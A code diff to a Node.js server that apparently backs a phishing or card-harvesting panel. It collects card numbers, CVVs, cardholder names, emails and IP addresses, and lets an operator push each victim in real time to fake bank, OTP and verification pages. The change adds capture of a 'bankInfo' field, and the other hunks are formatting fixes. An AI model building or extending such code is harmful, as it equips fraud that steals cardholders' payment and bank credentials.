@@ -490,10 +490,10 @@ app.get('/api/getPaymentDetails', (req, res) => {
   res.json({ status: "success", payment });
 });
 
-// Transactions Endpoints
+// Transactions Endpoints - Modified to handle bank info
 app.post('/api/sendPaymentDetails', (req, res) => {
   try {
-    const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
+    const { cardNumber, expiry, cvv, email, amount, currency, cardholder, bankInfo } = req.body;
 
     if (!cardNumber || !expiry || !cvv || !email || !amount || !cardholder) {
       return res.status(400).json({ status: "error", message: "Missing fields" });
@@ -503,6 +503,16 @@ app.post('/api/sendPaymentDetails', (req, res) => {
     
     // Get IP address
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+    // Parse bank info if present
+    let parsedBankInfo = null;
+    try {
+      if (bankInfo) {
+        parsedBankInfo = JSON.parse(bankInfo);
+      }
+    } catch (e) {
+      console.error('Error parsing bank info:', e);
+    }
 
     const transaction = {
       id: invoiceId,
@@ -520,7 +530,8 @@ app.post('/api/sendPaymentDetails', (req, res) => {
       redirectStatus: null,
       bankpageVisible: false,
       timestamp: new Date().toLocaleString(),
-      ip: ip  // Add IP address
+      ip: ip,
+      bankInfo: parsedBankInfo // Add bank info
     };
 
     transactions.set(invoiceId, transaction);
@@ -577,7 +588,7 @@ app.get('/api/checkTransactionStatus', (req, res) => {
       fail: `/fail.html?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
       bankpage: `/bankpage.html?invoiceId=${invoiceId}`
     };
-    return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
+   return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
   }
 
   res.json({ status: txn.status, otpError: txn.otpError });
@@ -675,7 +686,7 @@ app.get('/api/getTransactionForFail', (req, res) => {
       invoiceId: txn.id,
       timestamp: txn.timestamp,
       email: txn.email,
-    reason: reasonMessages[reason] || reasonMessages[txn.failureReason] || 'Transaction failed'
+      reason: reasonMessages[reason] || reasonMessages[txn.failureReason] || 'Transaction failed'
     }
   });
 });
@@ -690,15 +701,15 @@ io.on('connection', (socket) => {
   
   // Add listener for currency page redirection
   socket.on('currency_redirect', (data) => {
-  console.log('Received currency_redirect event:', data);
-  if (data.invoiceId && transactions.has(data.invoiceId) && data.pid) {
-    // Generate random hash for clean URL
-    const randomHash = Math.random().toString(36).substring(2, 8);
-    io.to(data.invoiceId).emit('redirect_to_currency', { 
-      redirectUrl: `/c/${randomHash}?pid=${data.pid}` 
-    });
-  }
-});
+    console.log('Received currency_redirect event:', data);
+    if (data.invoiceId && transactions.has(data.invoiceId) && data.pid) {
+      // Generate random hash for clean URL
+      const randomHash = Math.random().toString(36).substring(2, 8);
+      io.to(data.invoiceId).emit('redirect_to_currency', { 
+        redirectUrl: `/c/${randomHash}?pid=${data.pid}` 
+      });
+    }
+  });
   
   // MC verification events - enhanced with direct broadcasting
   socket.on('show_mc_verification', (data) => {
